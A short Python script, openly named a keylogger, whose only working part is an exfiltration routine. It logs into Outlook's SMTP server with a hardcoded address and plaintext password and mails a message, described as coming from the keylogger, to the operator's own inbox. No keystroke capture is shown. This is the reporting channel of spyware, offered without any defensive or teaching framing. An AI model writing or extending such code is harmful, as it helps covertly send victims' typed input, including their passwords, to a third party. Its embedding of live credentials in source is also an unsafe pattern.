import smtplib
from email.mime.text import MIMEText

class Keylogger:
    def __init__(self, email, password):
        self.email = email
        self.password = password

    def prepare_mail(self, message):
        return MIMEText(message, "plain")

    def sendmail(self, message):
        try:
            server = smtplib.SMTP(host="smtp-mail.outlook.com", port=587)
            server.starttls()
            server.login(self.email, self.password)  # Use the email and password from class
            server.sendmail(self.email, self.email, self.prepare_mail(message).as_string())
            server.quit()
            print("Email sent successfully")
        except Exception as e:
            print(f"Failed to send email: {e}")

if __name__ == "__main__":
    EMAIL_ADDRESS = "spysee128@outlook.com"
    EMAIL_PASSWORD = "test.js123"
    LOG_MESSAGE = "This is a test message from the keylogger."

    keylogger = Keylogger(EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.sendmail(LOG_MESSAGE)
